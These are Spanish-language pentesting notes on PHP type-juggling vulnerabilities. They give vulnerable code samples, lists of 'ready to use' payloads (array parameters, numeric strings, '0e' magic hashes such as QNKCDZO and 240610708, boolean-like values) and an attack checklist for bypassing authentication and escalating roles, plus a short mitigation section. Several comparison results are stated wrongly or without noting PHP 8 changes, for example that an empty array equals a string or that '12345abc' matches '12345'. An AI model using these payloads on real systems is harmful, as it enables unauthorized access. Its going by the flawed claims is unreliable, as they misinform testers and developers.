## 📚 **Índice**

- [[#🎯 1. Qué es realmente Type Juggling (explicado para un hacker)]]
- [[#🧠 2. Por qué PHP es vulnerable]]
- [[#⚔️ 3. Casos prácticos de explotación]]
    - [[#🧨 3.1 Bypass de autenticación por comparación débil]]
    - [[#🧨 3.2 Ataques usando arrays → payload `[]`]]
    - [[#🧨 3.3 Colisiones de hashes “mágicos” → prefijo `0e`]]
    - [[#🧨 3.4 Comparaciones numéricas vs. strings numéricos]]
    - [[#🧨 3.5 Type Juggling en JSON, Cookies, Tokens, API Params]]
- [[#🔍 4. Cómo detectar Type Juggling en auditoría (pentester checklist)]]
- [[#🛡️ 5. Cómo mitigar (para reportes profesionales)]]
- [[#🧩 6. Payloads listos para usar]]

---

# 🎯 **1. Qué es realmente Type Juggling (explicado para un hacker)**

**Type Juggling** es una vulnerabilidad donde PHP **cambia automáticamente el tipo de dato** durante comparaciones usando los operadores débiles:

- `==`
    
- `!=`
    
- `<>`
    
- `== false` / `== true`
    

PHP intenta “adivinar” qué tipo usar.  
Resultado: **se vuelve un caos manipulable**.

Ejemplo clásico:

```php
"00123" == 123   // true
"123abc" == 123  // true
"0e123456" == "0e987654" // true (convertidos a 0 * 10^x)
```

Esto permite **bypass de autenticaciones, colisiones de hashes, escaladas lógicas**, etc.

---

# 🧠 **2. Por qué PHP es vulnerable**

PHP tiene características peligrosas:

## ✔ **Conversión automática de string → número**

Si una cadena **empieza con un número**, PHP la interpreta como número en comparaciones débiles:

```php
var_dump("01abc" == 1);  // true
```

## ✔ **Operadores de comparación débil**

`==` NO compara tipos, solo valores “interpretados”.

## ✔ **Numerología científica involuntaria**

Cadenas tipo:

```
0e123456789         → PHP lo ve como 0 × 10¹² …
```

Todas equivalen a **cero** en comparación numérica:

```php
"0e12345" == "0e98765"   // true
```

Por eso existen los **"magic hashes"**.

## ✔ **PHP convierte arrays en TRUE, excepto cuando se comparan con strings**

Otro vector:

```php
[] == "algo"  // true
```

---

# ⚔️ **3. Casos prácticos de explotación**

Aquí están **los casos de explotación que SÍ te encontrarás en pentesting real**.

---

## 🧨 **3.1 Bypass de autenticación por comparación débil**

Código vulnerable:

```php
if ($_POST['pass'] == $stored_pass) {
    login();
}
```

Si `$stored_pass = "12345"`:

Payloads válidos:

|Envío del atacante|Resultado en PHP|
|---|---|
|`12345`|true|
|`"12345"`|true|
|`"012345"`|true|
|`"12345abc"`|true|
|`[]`|true (si `$stored_pass` es casteado raro)|

Ejemplo Burp Request:

```
pass[]=
```

---

## 🧨 **3.2 Ataques usando arrays → payload `[]`**

Esto es un bypass **poco conocido pero MUY poderoso**.

Si el código hace:

```php
if ($_GET['token'] == "admin") ...
```

Y tú envías:

```
?token[]=hola
```

PHP convierte la variable en array y **la comparación da false**, PERO si el backend ejecuta otra función que solo chequea existencia de variable, o si se cae en un `empty()` o `isset()`, puedes lograr bypass lógicos.

Más grave aún:

```
"0" == []
""  == []
false == []
true != []
```

Combina esto con validaciones pobres y revientas autenticaciones y validaciones lógicas.

---

## 🧨 **3.3 Colisiones de hashes “mágicos” → prefijo `0e`**

Este es el ataque más famoso.

PHP interpreta cualquier string que parezca notación científica con 0e... como **cero**.

Ejemplo típico:

```php
if (md5($input) == md5("correct_password")) {
    auth ok
}
```

Hashes débiles que cumplen:

```
md5("240610708") = 0e462097431906509019562988736854
md5("QNKCDZO")   = 0e830400451993494058024219903391
```

Ambos son **equal == true**.

Payload:

```
input=240610708
```

### 🧲 **Lista de hashes mágicos conocidos**

(usa estos en burp directamente)

- `QNKCDZO`
    
- `240610708`
    
- `aabg7XSs`
    
- `s878926199a`
    
- `s155964671a`
    

---

## 🧨 **3.4 Comparaciones numéricas vs. strings numéricos**

Ejemplo real:

```php
if ($_GET['id'] == "0") ...
```

Payload que lo rompe:

```
?id=0abc
```

Ya que:

```php
"0abc" == 0 // true
```

---

## 🧨 **3.5 Type Juggling en JSON, Cookies, Tokens, API Params**

### Caso típico en API PHP con JSON:

```php
{"role": "1"}
```

Puedes probar:

```
{"role": 1}
{"role": "01"}
{"role": []}
{"role": false}
{"role": "0e12345"}
```

Muchas veces un `"1"` (string) se compara con un `1` (entero) en un `==`.

Resultado → **Privilege escalation**.

---

# 🔍 **4. Cómo detectar Type Juggling en auditoría (pentester checklist)**

### ✔ 1. Revisa comparaciones débiles en el código:

- `==`
    
- `!=`
    
- `== true`
    
- `== false`
    

### ✔ 2. Intenta enviar:

- Strings numéricos (`000123`)
    
- Strings mixtas (`123abc`)
    
- Magic hashes (`QNKCDZO`)
    
- Arrays (`field[]=1`)
    
- Boolean-like (`true`, `false`, `null`, `"0"`)
    

### ✔ 3. Observa respuestas:

- Cambios en lógica
    
- Bypass en login
    
- Saltos de condiciones
    
- Diferencias de error/timing
    

### ✔ 4. Revisa logs para endpoints que transformen datos automáticamente:

- `json_decode`
    
- `intval()`
    
- `settype()`
    
- casteos implícitos en bucles
    

---

# 🛡️ **5. Cómo mitigar (para reportes profesionales)**

### ✔ **Usar comparaciones estrictas**

- `===`
    
- `!==`
    

### ✔ **Validar tipos**

- `is_string()`
    
- `is_int()`
    
- `ctype_digit()`
    

### ✔ **Nunca comparar hashes con ==**

Siempre usar comparación de strings estricta:

```php
hash_equals($a, $b);
```

### ✔ Sanitizar JSON y parámetros antes de usarlos

---

# 🧩 **6. Payloads listos para usar**

### 🔥 **Arrays**

```
param[]=
param[] = value
```

### 🔥 **Strings numéricos peligrosos**

```
000123
1e2
0e1234567
123abc
```

### 🔥 **Magic Hashes**

```
QNKCDZO
240610708
aabg7XSs
s878926199a
```

### 🔥 **Boolean-like**

```
false
true
null
"0"
```

---

# ✅ **Checklist de ataque (rápido)**

-  Probar comparaciones débiles con strings numéricos
    
-  Probar arrays como payload
    
-  Probar `0e*` magic hashes
    
-  Probar strings mixtos (`123abc`)
    
-  Probar coerción `true/false/null`
    
-  Revisar bypass de login / roles
    
-  Revisar JSON → PHP coerción automática
    

---
